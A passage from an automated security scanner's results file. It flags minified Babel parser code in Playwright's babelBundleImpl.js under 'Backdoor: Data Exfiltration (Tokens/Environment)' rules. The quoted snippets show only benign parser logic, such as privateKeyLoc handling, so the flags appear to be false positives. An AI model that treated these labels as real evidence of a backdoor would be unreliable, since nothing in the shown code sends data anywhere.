                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 93345,
                  "endLine": 8,
                  "endColumn": 93350,
                  "snippet": {
                    "text": "[a];if(o&&!(i.indexOf(o)>=0)){if((0,Qa.isTSAnyKeyword)(o))return[o];if((0,Qa.isTSBaseType)(o)){n.set(o.type,o);continue}if((0,Qa.isTSUnionType)(o)){s.has(o.types)||(t.push(...o.types),s.add(o.types));continue}if((0,Qa.isTSTypeReference)(o)&&o.typeParameters){let l=Kv(o.typeName);if(r.has(l)){let u=r.get(l);u.typeParameters?o.typeParameters&&(u.typeParameters.params.push(...o.typeParameters.params),u.typeParameters.params=Gv(u.typeParameters.params)):u=o.typeParameters}else r.set(l,o);continue}i.push(o)}}for(let[,a]of n)i.push(a);for(let[,a]of r)i.push(a);return i}});var Yv=E(Md=>{\"use strict\";Objec",
                    "rendered": {
                      "text": "[a];if(o&&!(i.indexOf(o)>=0)){if((0,Qa.isTSAnyKeyword)(o))return[o];if((0,Qa.isTSBaseType)(o)){n.set(o.type,o);continue}if((0,Qa.isTSUnionType)(o)){s.has(o.types)||(t.push(...o.types),s.add(o.types));continue}if((0,Qa.isTSTypeReference)(o)&&o.typeParameters){let l=Kv(o.typeName);if(r.has(l)){let u=r.get(l);u.typeParameters?o.typeParameters&&(u.typeParameters.params.push(...o.typeParameters.params),u.typeParameters.params=Gv(u.typeParameters.params)):u=o.typeParameters}else r.set(l,o);continue}i.push(o)}}for(let[,a]of n)i.push(a);for(let[,a]of r)i.push(a);return i}});var Yv=E(Md=>{\"use strict\";Objec",
                      "markdown": "`[a];if(o&&!(i.indexOf(o)>=0)){if((0,Qa.isTSAnyKeyword)(o))return[o];if((0,Qa.isTSBaseType)(o)){n.set(o.type,o);continue}if((0,Qa.isTSUnionType)(o)){s.has(o.types)||(t.push(...o.types),s.add(o.types));continue}if((0,Qa.isTSTypeReference)(o)&&o.typeParameters){let l=Kv(o.typeName);if(r.has(l)){let u=r.get(l);u.typeParameters?o.typeParameters&&(u.typeParameters.params.push(...o.typeParameters.params),u.typeParameters.params=Gv(u.typeParameters.params)):u=o.typeParameters}else r.set(l,o);continue}i.push(o)}}for(let[,a]of n)i.push(a);for(let[,a]of r)i.push(a);return i}});var Yv=E(Md=>{\"use strict\";Objec`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 92273,
                  "endLine": 8,
                  "endColumn": 92278,
                  "snippet": {
                    "text": ";if(o&&!(i.indexOf(o)>=0)){if((0,za.isAnyTypeAnnotation)(o))return[o];if((0,za.isFlowBaseAnnotation)(o)){n.set(o.type,o);continue}if((0,za.isUnionTypeAnnotation)(o)){s.has(o.types)||(t.push(...o.types),s.add(o.types));continue}if((0,za.isGenericTypeAnnotation)(o)){let l=Vv(o.id);if(r.has(l)){let u=r.get(l);u.typeParameters?o.typeParameters&&(u.typeParameters.params.push(...o.typeParameters.params),u.typeParameters.params=$v(u.typeParameters.params)):u=o.typeParameters}else r.set(l,o);continue}i.push(o)}}for(let[,a]of n)i.push(a);for(let[,a]of r)i.push(a);return i}});var Wv=E(jd=>{\"use strict\";Objec",
                    "rendered": {
                      "text": ";if(o&&!(i.indexOf(o)>=0)){if((0,za.isAnyTypeAnnotation)(o))return[o];if((0,za.isFlowBaseAnnotation)(o)){n.set(o.type,o);continue}if((0,za.isUnionTypeAnnotation)(o)){s.has(o.types)||(t.push(...o.types),s.add(o.types));continue}if((0,za.isGenericTypeAnnotation)(o)){let l=Vv(o.id);if(r.has(l)){let u=r.get(l);u.typeParameters?o.typeParameters&&(u.typeParameters.params.push(...o.typeParameters.params),u.typeParameters.params=$v(u.typeParameters.params)):u=o.typeParameters}else r.set(l,o);continue}i.push(o)}}for(let[,a]of n)i.push(a);for(let[,a]of r)i.push(a);return i}});var Wv=E(jd=>{\"use strict\";Objec",
                      "markdown": "`;if(o&&!(i.indexOf(o)>=0)){if((0,za.isAnyTypeAnnotation)(o))return[o];if((0,za.isFlowBaseAnnotation)(o)){n.set(o.type,o);continue}if((0,za.isUnionTypeAnnotation)(o)){s.has(o.types)||(t.push(...o.types),s.add(o.types));continue}if((0,za.isGenericTypeAnnotation)(o)){let l=Vv(o.id);if(r.has(l)){let u=r.get(l);u.typeParameters?o.typeParameters&&(u.typeParameters.params.push(...o.typeParameters.params),u.typeParameters.params=$v(u.typeParameters.params)):u=o.typeParameters}else r.set(l,o);continue}i.push(o)}}for(let[,a]of n)i.push(a);for(let[,a]of r)i.push(a);return i}});var Wv=E(jd=>{\"use strict\";Objec`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 800,
                  "startColumn": 56,
                  "endLine": 800,
                  "endColumn": 66,
                  "snippet": {
                    "text": "  }\n`;ne.classPrivateFieldLooseBase=ae(\"7.0.0-beta.0\")`\n  export default function _classPrivateFieldBase(receiver, privateKey) {\n    if (!Object.prototype.hasOwnProperty.call(receiver, privateKey)) {\n      throw new TypeError(\"attempted to use private field on non-instance\");\n    }\n    return receiver;\n",
                    "rendered": {
                      "text": "  }\n`;ne.classPrivateFieldLooseBase=ae(\"7.0.0-beta.0\")`\n  export default function _classPrivateFieldBase(receiver, privateKey) {\n    if (!Object.prototype.hasOwnProperty.call(receiver, privateKey)) {\n      throw new TypeError(\"attempted to use private field on non-instance\");\n    }\n    return receiver;\n",
                      "markdown": "`  }\n`;ne.classPrivateFieldLooseBase=ae(\"7.0.0-beta.0\")`\n  export default function _classPrivateFieldBase(receiver, privateKey) {\n    if (!Object.prototype.hasOwnProperty.call(receiver, privateKey)) {\n      throw new TypeError(\"attempted to use private field on non-instance\");\n    }\n    return receiver;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 799,
                  "startColumn": 59,
                  "endLine": 799,
                  "endColumn": 69,
                  "snippet": {
                    "text": "    return \"__private_\" + (id++) + \"_\" + name;\n  }\n`;ne.classPrivateFieldLooseBase=ae(\"7.0.0-beta.0\")`\n  export default function _classPrivateFieldBase(receiver, privateKey) {\n    if (!Object.prototype.hasOwnProperty.call(receiver, privateKey)) {\n      throw new TypeError(\"attempted to use private field on non-instance\");\n    }\n",
                    "rendered": {
                      "text": "    return \"__private_\" + (id++) + \"_\" + name;\n  }\n`;ne.classPrivateFieldLooseBase=ae(\"7.0.0-beta.0\")`\n  export default function _classPrivateFieldBase(receiver, privateKey) {\n    if (!Object.prototype.hasOwnProperty.call(receiver, privateKey)) {\n      throw new TypeError(\"attempted to use private field on non-instance\");\n    }\n",
                      "markdown": "`    return \"__private_\" + (id++) + \"_\" + name;\n  }\n`;ne.classPrivateFieldLooseBase=ae(\"7.0.0-beta.0\")`\n  export default function _classPrivateFieldBase(receiver, privateKey) {\n    if (!Object.prototype.hasOwnProperty.call(receiver, privateKey)) {\n      throw new TypeError(\"attempted to use private field on non-instance\");\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 4381,
                  "endLine": 30,
                  "endColumn": 4391,
                  "snippet": {
                    "text": "if(zr(n))i=this.parseIdentifier(!0);else switch(n){case 134:i=this.parseNumericLiteral(s);break;case 133:i=this.parseStringLiteral(s);break;case 135:i=this.parseBigIntLiteral(s);break;case 136:i=this.parseDecimalLiteral(s);break;case 138:{let a=this.state.startLoc;r!=null?r.privateKeyLoc===null&&(r.privateKeyLoc=a):this.raise(k.UnexpectedPrivateField,a),i=this.parsePrivateName();break}default:this.unexpected()}t.key=i,n!==138&&(t.computed=!1)}return t.key}initFunction(t,r){t.id=null,t.generator=!1,t.async=r}parseMethod(t,r,n,s,i,a,o=!1){this.initFunction(t,n),t.generator=r,this.scope.enter(18|(o?64:0)|(",
                    "rendered": {
                      "text": "if(zr(n))i=this.parseIdentifier(!0);else switch(n){case 134:i=this.parseNumericLiteral(s);break;case 133:i=this.parseStringLiteral(s);break;case 135:i=this.parseBigIntLiteral(s);break;case 136:i=this.parseDecimalLiteral(s);break;case 138:{let a=this.state.startLoc;r!=null?r.privateKeyLoc===null&&(r.privateKeyLoc=a):this.raise(k.UnexpectedPrivateField,a),i=this.parsePrivateName();break}default:this.unexpected()}t.key=i,n!==138&&(t.computed=!1)}return t.key}initFunction(t,r){t.id=null,t.generator=!1,t.async=r}parseMethod(t,r,n,s,i,a,o=!1){this.initFunction(t,n),t.generator=r,this.scope.enter(18|(o?64:0)|(",
                      "markdown": "`if(zr(n))i=this.parseIdentifier(!0);else switch(n){case 134:i=this.parseNumericLiteral(s);break;case 133:i=this.parseStringLiteral(s);break;case 135:i=this.parseBigIntLiteral(s);break;case 136:i=this.parseDecimalLiteral(s);break;case 138:{let a=this.state.startLoc;r!=null?r.privateKeyLoc===null&&(r.privateKeyLoc=a):this.raise(k.UnexpectedPrivateField,a),i=this.parsePrivateName();break}default:this.unexpected()}t.key=i,n!==138&&(t.computed=!1)}return t.key}initFunction(t,r){t.id=null,t.generator=!1,t.async=r}parseMethod(t,r,n,s,i,a,o=!1){this.initFunction(t,n),t.generator=r,this.scope.enter(18|(o?64:0)|(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 4356,
                  "endLine": 30,
                  "endColumn": 4366,
                  "snippet": {
                    "text": ":n,value:s}=this.state,i;if(zr(n))i=this.parseIdentifier(!0);else switch(n){case 134:i=this.parseNumericLiteral(s);break;case 133:i=this.parseStringLiteral(s);break;case 135:i=this.parseBigIntLiteral(s);break;case 136:i=this.parseDecimalLiteral(s);break;case 138:{let a=this.state.startLoc;r!=null?r.privateKeyLoc===null&&(r.privateKeyLoc=a):this.raise(k.UnexpectedPrivateField,a),i=this.parsePrivateName();break}default:this.unexpected()}t.key=i,n!==138&&(t.computed=!1)}return t.key}initFunction(t,r){t.id=null,t.generator=!1,t.async=r}parseMethod(t,r,n,s,i,a,o=!1){this.initFunction(t,n),t.generator=r,this.",
                    "rendered": {
                      "text": ":n,value:s}=this.state,i;if(zr(n))i=this.parseIdentifier(!0);else switch(n){case 134:i=this.parseNumericLiteral(s);break;case 133:i=this.parseStringLiteral(s);break;case 135:i=this.parseBigIntLiteral(s);break;case 136:i=this.parseDecimalLiteral(s);break;case 138:{let a=this.state.startLoc;r!=null?r.privateKeyLoc===null&&(r.privateKeyLoc=a):this.raise(k.UnexpectedPrivateField,a),i=this.parsePrivateName();break}default:this.unexpected()}t.key=i,n!==138&&(t.computed=!1)}return t.key}initFunction(t,r){t.id=null,t.generator=!1,t.async=r}parseMethod(t,r,n,s,i,a,o=!1){this.initFunction(t,n),t.generator=r,this.",
                      "markdown": "`:n,value:s}=this.state,i;if(zr(n))i=this.parseIdentifier(!0);else switch(n){case 134:i=this.parseNumericLiteral(s);break;case 133:i=this.parseStringLiteral(s);break;case 135:i=this.parseBigIntLiteral(s);break;case 136:i=this.parseDecimalLiteral(s);break;case 138:{let a=this.state.startLoc;r!=null?r.privateKeyLoc===null&&(r.privateKeyLoc=a):this.raise(k.UnexpectedPrivateField,a),i=this.parsePrivateName();break}default:this.unexpected()}t.key=i,n!==138&&(t.computed=!1)}return t.key}initFunction(t,r){t.id=null,t.generator=!1,t.async=r}parseMethod(t,r,n,s,i,a,o=!1){this.initFunction(t,n),t.generator=r,this.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 82371,
                  "endLine": 29,
                  "endColumn": 82381,
                  "snippet": {
                    "text": "29)){this.toAssignable(a,!0),o.left=a;let u=n.index;t.doubleProtoLoc!=null&&t.doubleProtoLoc.index>=u&&(t.doubleProtoLoc=null),t.shorthandAssignLoc!=null&&t.shorthandAssignLoc.index>=u&&(t.shorthandAssignLoc=null),t.privateKeyLoc!=null&&t.privateKeyLoc.index>=u&&(this.checkDestructuringPrivate(t),t.privateKeyLoc=null)}else o.left=a;return this.next(),o.right=this.parseMaybeAssign(),this.checkLVal(a,{in:this.finishNode(o,\"AssignmentExpression\")}),o}else s&&this.checkExpressionErrors(t,!0);return a}parseMaybeConditional(t){let r=this.state.startLoc,n=this.state.potentialArrowAt,s=this.parseExprOps(t);retu",
                    "rendered": {
                      "text": "29)){this.toAssignable(a,!0),o.left=a;let u=n.index;t.doubleProtoLoc!=null&&t.doubleProtoLoc.index>=u&&(t.doubleProtoLoc=null),t.shorthandAssignLoc!=null&&t.shorthandAssignLoc.index>=u&&(t.shorthandAssignLoc=null),t.privateKeyLoc!=null&&t.privateKeyLoc.index>=u&&(this.checkDestructuringPrivate(t),t.privateKeyLoc=null)}else o.left=a;return this.next(),o.right=this.parseMaybeAssign(),this.checkLVal(a,{in:this.finishNode(o,\"AssignmentExpression\")}),o}else s&&this.checkExpressionErrors(t,!0);return a}parseMaybeConditional(t){let r=this.state.startLoc,n=this.state.potentialArrowAt,s=this.parseExprOps(t);retu",
                      "markdown": "`29)){this.toAssignable(a,!0),o.left=a;let u=n.index;t.doubleProtoLoc!=null&&t.doubleProtoLoc.index>=u&&(t.doubleProtoLoc=null),t.shorthandAssignLoc!=null&&t.shorthandAssignLoc.index>=u&&(t.shorthandAssignLoc=null),t.privateKeyLoc!=null&&t.privateKeyLoc.index>=u&&(this.checkDestructuringPrivate(t),t.privateKeyLoc=null)}else o.left=a;return this.next(),o.right=this.parseMaybeAssign(),this.checkLVal(a,{in:this.finishNode(o,\"AssignmentExpression\")}),o}else s&&this.checkExpressionErrors(t,!0);return a}parseMaybeConditional(t){let r=this.state.startLoc,n=this.state.potentialArrowAt,s=this.parseExprOps(t);retu`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 82310,
                  "endLine": 29,
                  "endColumn": 82320,
                  "snippet": {
                    "text": "startNodeAt(n),l=this.state.value;if(o.operator=l,this.match(29)){this.toAssignable(a,!0),o.left=a;let u=n.index;t.doubleProtoLoc!=null&&t.doubleProtoLoc.index>=u&&(t.doubleProtoLoc=null),t.shorthandAssignLoc!=null&&t.shorthandAssignLoc.index>=u&&(t.shorthandAssignLoc=null),t.privateKeyLoc!=null&&t.privateKeyLoc.index>=u&&(this.checkDestructuringPrivate(t),t.privateKeyLoc=null)}else o.left=a;return this.next(),o.right=this.parseMaybeAssign(),this.checkLVal(a,{in:this.finishNode(o,\"AssignmentExpression\")}),o}else s&&this.checkExpressionErrors(t,!0);return a}parseMaybeConditional(t){let r=this.state.start",
                    "rendered": {
                      "text": "startNodeAt(n),l=this.state.value;if(o.operator=l,this.match(29)){this.toAssignable(a,!0),o.left=a;let u=n.index;t.doubleProtoLoc!=null&&t.doubleProtoLoc.index>=u&&(t.doubleProtoLoc=null),t.shorthandAssignLoc!=null&&t.shorthandAssignLoc.index>=u&&(t.shorthandAssignLoc=null),t.privateKeyLoc!=null&&t.privateKeyLoc.index>=u&&(this.checkDestructuringPrivate(t),t.privateKeyLoc=null)}else o.left=a;return this.next(),o.right=this.parseMaybeAssign(),this.checkLVal(a,{in:this.finishNode(o,\"AssignmentExpression\")}),o}else s&&this.checkExpressionErrors(t,!0);return a}parseMaybeConditional(t){let r=this.state.start",
                      "markdown": "`startNodeAt(n),l=this.state.value;if(o.operator=l,this.match(29)){this.toAssignable(a,!0),o.left=a;let u=n.index;t.doubleProtoLoc!=null&&t.doubleProtoLoc.index>=u&&(t.doubleProtoLoc=null),t.shorthandAssignLoc!=null&&t.shorthandAssignLoc.index>=u&&(t.shorthandAssignLoc=null),t.privateKeyLoc!=null&&t.privateKeyLoc.index>=u&&(this.checkDestructuringPrivate(t),t.privateKeyLoc=null)}else o.left=a;return this.next(),o.right=this.parseMaybeAssign(),this.checkLVal(a,{in:this.finishNode(o,\"AssignmentExpression\")}),o}else s&&this.checkExpressionErrors(t,!0);return a}parseMaybeConditional(t){let r=this.state.start`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 82287,
                  "endLine": 29,
                  "endColumn": 82297,
                  "snippet": {
                    "text": "tate.type)){let o=this.startNodeAt(n),l=this.state.value;if(o.operator=l,this.match(29)){this.toAssignable(a,!0),o.left=a;let u=n.index;t.doubleProtoLoc!=null&&t.doubleProtoLoc.index>=u&&(t.doubleProtoLoc=null),t.shorthandAssignLoc!=null&&t.shorthandAssignLoc.index>=u&&(t.shorthandAssignLoc=null),t.privateKeyLoc!=null&&t.privateKeyLoc.index>=u&&(this.checkDestructuringPrivate(t),t.privateKeyLoc=null)}else o.left=a;return this.next(),o.right=this.parseMaybeAssign(),this.checkLVal(a,{in:this.finishNode(o,\"AssignmentExpression\")}),o}else s&&this.checkExpressionErrors(t,!0);return a}parseMaybeConditional(t)",
                    "rendered": {
                      "text": "tate.type)){let o=this.startNodeAt(n),l=this.state.value;if(o.operator=l,this.match(29)){this.toAssignable(a,!0),o.left=a;let u=n.index;t.doubleProtoLoc!=null&&t.doubleProtoLoc.index>=u&&(t.doubleProtoLoc=null),t.shorthandAssignLoc!=null&&t.shorthandAssignLoc.index>=u&&(t.shorthandAssignLoc=null),t.privateKeyLoc!=null&&t.privateKeyLoc.index>=u&&(this.checkDestructuringPrivate(t),t.privateKeyLoc=null)}else o.left=a;return this.next(),o.right=this.parseMaybeAssign(),this.checkLVal(a,{in:this.finishNode(o,\"AssignmentExpression\")}),o}else s&&this.checkExpressionErrors(t,!0);return a}parseMaybeConditional(t)",
                      "markdown": "`tate.type)){let o=this.startNodeAt(n),l=this.state.value;if(o.operator=l,this.match(29)){this.toAssignable(a,!0),o.left=a;let u=n.index;t.doubleProtoLoc!=null&&t.doubleProtoLoc.index>=u&&(t.doubleProtoLoc=null),t.shorthandAssignLoc!=null&&t.shorthandAssignLoc.index>=u&&(t.shorthandAssignLoc=null),t.privateKeyLoc!=null&&t.privateKeyLoc.index>=u&&(this.checkDestructuringPrivate(t),t.privateKeyLoc=null)}else o.left=a;return this.next(),o.right=this.parseMaybeAssign(),this.checkLVal(a,{in:this.finishNode(o,\"AssignmentExpression\")}),o}else s&&this.checkExpressionErrors(t,!0);return a}parseMaybeConditional(t)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 26383,
                  "endLine": 27,
                  "endColumn": 26393,
                  "snippet": {
                    "text": "essionScope=u}}enterInitialScopes(){let t=0;this.inModule&&(t|=2),this.scope.enter(1),this.prodParam.enter(t)}checkDestructuringPrivate(t){let{privateKeyLoc:r}=t;r!==null&&this.expectPlugin(\"destructuringPrivate\",r)}},Ji=class{constructor(){this.shorthandAssignLoc=null,this.doubleProtoLoc=null,this.privateKeyLoc=null,this.optionalParametersLoc=null}},Zi=class{constructor(t,r,n){this.type=\"\",this.start=r,this.end=0,this.loc=new zi(n),t!=null&&t.options.ranges&&(this.range=[r,0]),t!=null&&t.filename&&(this.loc.filename=t.filename)}},Ry=Zi.prototype;Ry.__clone=function(){let e=new Zi(void 0,this.start,this",
                    "rendered": {
                      "text": "essionScope=u}}enterInitialScopes(){let t=0;this.inModule&&(t|=2),this.scope.enter(1),this.prodParam.enter(t)}checkDestructuringPrivate(t){let{privateKeyLoc:r}=t;r!==null&&this.expectPlugin(\"destructuringPrivate\",r)}},Ji=class{constructor(){this.shorthandAssignLoc=null,this.doubleProtoLoc=null,this.privateKeyLoc=null,this.optionalParametersLoc=null}},Zi=class{constructor(t,r,n){this.type=\"\",this.start=r,this.end=0,this.loc=new zi(n),t!=null&&t.options.ranges&&(this.range=[r,0]),t!=null&&t.filename&&(this.loc.filename=t.filename)}},Ry=Zi.prototype;Ry.__clone=function(){let e=new Zi(void 0,this.start,this",
                      "markdown": "`essionScope=u}}enterInitialScopes(){let t=0;this.inModule&&(t|=2),this.scope.enter(1),this.prodParam.enter(t)}checkDestructuringPrivate(t){let{privateKeyLoc:r}=t;r!==null&&this.expectPlugin(\"destructuringPrivate\",r)}},Ji=class{constructor(){this.shorthandAssignLoc=null,this.doubleProtoLoc=null,this.privateKeyLoc=null,this.optionalParametersLoc=null}},Zi=class{constructor(t,r,n){this.type=\"\",this.start=r,this.end=0,this.loc=new zi(n),t!=null&&t.options.ranges&&(this.range=[r,0]),t!=null&&t.filename&&(this.loc.filename=t.filename)}},Ry=Zi.prototype;Ry.__clone=function(){let e=new Zi(void 0,this.start,this`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 26226,
                  "endLine": 27,
                  "endColumn": 26236,
                  "snippet": {
                    "text": "is.expressionScope=new Ty(this),()=>{this.state.labels=r,this.exportedIdentifiers=n,this.inModule=s,this.scope=i,this.prodParam=o,this.classScope=l,this.expressionScope=u}}enterInitialScopes(){let t=0;this.inModule&&(t|=2),this.scope.enter(1),this.prodParam.enter(t)}checkDestructuringPrivate(t){let{privateKeyLoc:r}=t;r!==null&&this.expectPlugin(\"destructuringPrivate\",r)}},Ji=class{constructor(){this.shorthandAssignLoc=null,this.doubleProtoLoc=null,this.privateKeyLoc=null,this.optionalParametersLoc=null}},Zi=class{constructor(t,r,n){this.type=\"\",this.start=r,this.end=0,this.loc=new zi(n),t!=null&&t.optio",
                    "rendered": {
                      "text": "is.expressionScope=new Ty(this),()=>{this.state.labels=r,this.exportedIdentifiers=n,this.inModule=s,this.scope=i,this.prodParam=o,this.classScope=l,this.expressionScope=u}}enterInitialScopes(){let t=0;this.inModule&&(t|=2),this.scope.enter(1),this.prodParam.enter(t)}checkDestructuringPrivate(t){let{privateKeyLoc:r}=t;r!==null&&this.expectPlugin(\"destructuringPrivate\",r)}},Ji=class{constructor(){this.shorthandAssignLoc=null,this.doubleProtoLoc=null,this.privateKeyLoc=null,this.optionalParametersLoc=null}},Zi=class{constructor(t,r,n){this.type=\"\",this.start=r,this.end=0,this.loc=new zi(n),t!=null&&t.optio",
                      "markdown": "`is.expressionScope=new Ty(this),()=>{this.state.labels=r,this.exportedIdentifiers=n,this.inModule=s,this.scope=i,this.prodParam=o,this.classScope=l,this.expressionScope=u}}enterInitialScopes(){let t=0;this.inModule&&(t|=2),this.scope.enter(1),this.prodParam.enter(t)}checkDestructuringPrivate(t){let{privateKeyLoc:r}=t;r!==null&&this.expectPlugin(\"destructuringPrivate\",r)}},Ji=class{constructor(){this.shorthandAssignLoc=null,this.doubleProtoLoc=null,this.privateKeyLoc=null,this.optionalParametersLoc=null}},Zi=class{constructor(t,r,n){this.type=\"\",this.start=r,this.end=0,this.loc=new zi(n),t!=null&&t.optio`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 24911,
                  "endLine": 27,
                  "endColumn": 24921,
                  "snippet": {
                    "text": "e:null}}catch(s){let i=this.state;if(this.state=r,s instanceof SyntaxError)return{node:null,error:s,thrown:!0,aborted:!1,failState:i};if(s===n)return{node:n.node,error:null,thrown:!1,aborted:!0,failState:i};throw s}}checkExpressionErrors(t,r){if(!t)return!1;let{shorthandAssignLoc:n,doubleProtoLoc:s,privateKeyLoc:i,optionalParametersLoc:a}=t,o=!!n||!!s||!!a||!!i;if(!r)return o;n!=null&&this.raise(k.InvalidCoverInitializedName,n),s!=null&&this.raise(k.DuplicateProto,s),i!=null&&this.raise(k.UnexpectedPrivateField,i),a!=null&&this.unexpected(a)}isLiteralPropertyName(){return zP(this.state.type)}isPrivateNa",
                    "rendered": {
                      "text": "e:null}}catch(s){let i=this.state;if(this.state=r,s instanceof SyntaxError)return{node:null,error:s,thrown:!0,aborted:!1,failState:i};if(s===n)return{node:n.node,error:null,thrown:!1,aborted:!0,failState:i};throw s}}checkExpressionErrors(t,r){if(!t)return!1;let{shorthandAssignLoc:n,doubleProtoLoc:s,privateKeyLoc:i,optionalParametersLoc:a}=t,o=!!n||!!s||!!a||!!i;if(!r)return o;n!=null&&this.raise(k.InvalidCoverInitializedName,n),s!=null&&this.raise(k.DuplicateProto,s),i!=null&&this.raise(k.UnexpectedPrivateField,i),a!=null&&this.unexpected(a)}isLiteralPropertyName(){return zP(this.state.type)}isPrivateNa",
                      "markdown": "`e:null}}catch(s){let i=this.state;if(this.state=r,s instanceof SyntaxError)return{node:null,error:s,thrown:!0,aborted:!1,failState:i};if(s===n)return{node:n.node,error:null,thrown:!1,aborted:!0,failState:i};throw s}}checkExpressionErrors(t,r){if(!t)return!1;let{shorthandAssignLoc:n,doubleProtoLoc:s,privateKeyLoc:i,optionalParametersLoc:a}=t,o=!!n||!!s||!!a||!!i;if(!r)return o;n!=null&&this.raise(k.InvalidCoverInitializedName,n),s!=null&&this.raise(k.DuplicateProto,s),i!=null&&this.raise(k.UnexpectedPrivateField,i),a!=null&&this.unexpected(a)}isLiteralPropertyName(){return zP(this.state.type)}isPrivateNa`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
